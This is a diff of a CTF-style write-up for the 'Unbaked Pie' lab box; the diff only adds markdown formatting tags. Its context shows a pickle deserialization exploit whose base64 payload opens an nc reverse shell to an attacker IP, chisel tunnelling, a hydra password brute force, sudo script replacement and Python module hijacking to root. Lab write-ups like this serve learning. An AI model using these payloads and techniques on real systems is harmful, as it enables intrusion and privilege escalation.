@@ -73,6 +73,7 @@ PORT     STATE SERVICE    VERSION
 |_    </html>
 1 service unrecognized despite returning data.
 ```
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -100,6 +101,7 @@ if __name__ == '__main__':
     pickled = pickle.dumps(RCE())
     print(base64.urlsafe_b64encode(pickled))
 ```
+{: .nolineno}
 
 Now I executed this payload and got an input that I used in `search_cookie=` parameter in /search request and send the request →
 
@@ -108,6 +110,7 @@ python3 exploit.py
 
 b'gASVaQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjE5ybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjgzLjE1NiA0NDQ0ID4vdG1wL2aUhZRSlC4='
 ```
+{: .nolineno}
 
 ![Untitled](Unbaked%20Pie/Untitled%202.png)
 
@@ -219,6 +222,7 @@ ip a
        valid_lft forever preferred_lft forever
 root@8b39a559b296:~#
 ```
+{: .nolineno}
 
 I noticed from bash history that the root user is trying to ssh login to ramsey so I have to try pivoting method through `chisel` tool .
 
@@ -235,6 +239,7 @@ From Attacker machine lets setup the server in listener mode →
 
 2023/10/31 21:42:39 server: session#2: tun: proxy#R:1234=>172.17.0.1:22: Listening
 ```
+{: .nolineno}
 
 Now on victim machine end lets transfer this chisel Tools to this machine through wget tool and then use the client mode →
 
@@ -243,6 +248,7 @@ Now on victim machine end lets transfer this chisel Tools to this machine throug
 2023/10/31 16:12:41 client: Connecting to ws://10.8.83.156:8000
 2023/10/31 16:12:43 client: Connected (Latency 174.8908ms)
 ```
+{: .nolineno}
 
 Here in above chisel code I ran it , as client mode and given the location to connect to server with `Attackers IP` (10.8.83.156) and `Port Number` (8000) , then `R` represent the default location here it is `localhost` (127.0.0.1) and the `Port Number` (1234) where the port will be morphed to . 
 
@@ -264,6 +270,7 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
 ```
+{: .nolineno}
 
 Lets crack the password of ramsey from here →
 
@@ -277,12 +284,14 @@ Lets crack the password of ramsey from here →
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-31 21:46:35
 ```
+{: .nolineno}
 
 I get the credentails as →
 
 ```text
 ramsey : 12345678
 ```
+{: .nolineno}
 
 ## SSH Service ⤵️
 
@@ -311,6 +320,7 @@ ramsey@unbaked:~$ id
 uid=1001(ramsey) gid=1001(ramsey) groups=1001(ramsey)
 ramsey@unbaked:~$
 ```
+{: .nolineno}
 
 I have to see another privileges to root →
 
@@ -324,6 +334,7 @@ User ramsey may run the following commands on unbaked:
     (oliver) /usr/bin/python /home/ramsey/vuln.py
 ramsey@unbaked:~$
 ```
+{: .nolineno}
 
 And this `vuln.py` have these permissions so I will be replacing it with my vuln.py file like this →
 
@@ -355,6 +366,7 @@ drwxrwxr-x 2 ramsey ramsey 4096 Oct  3  2020 .nano
 -rwxrwxr-x 1 ramsey ramsey 1649 Nov  1 00:34 vuln.py
 ramsey@unbaked:~$
 ```
+{: .nolineno}
 
 Now lets execute for oliver user →
 
@@ -372,6 +384,7 @@ User oliver may run the following commands on unbaked:
     (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
 oliver@unbaked:~$
 ```
+{: .nolineno}
 
 In this case I have to do **[Module Hijacking](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/#module-hijacking)** ⤵️ 
 
@@ -393,6 +406,7 @@ client = docker.from_env()
 client.containers.run("python-django:latest", "sleep infinity", detach=True)
 oliver@unbaked:/opt$
 ```
+{: .nolineno}
 
 Now lets create a `docker.py` file in /tmp directory with bash executable commands and then set the `PYTHONPATH` for it to `/tmp/` directory so that import docker should load the docker from `/tmp/docker.py` file and I get the shell →
 
@@ -427,5 +441,6 @@ ps: dont be mad us, we hope you learn something new
 flag: THM{FLAG_FLAG_FLAG_FLAG}
 root@unbaked:/root#
 ```
+{: .nolineno}
 
 I am root now !!
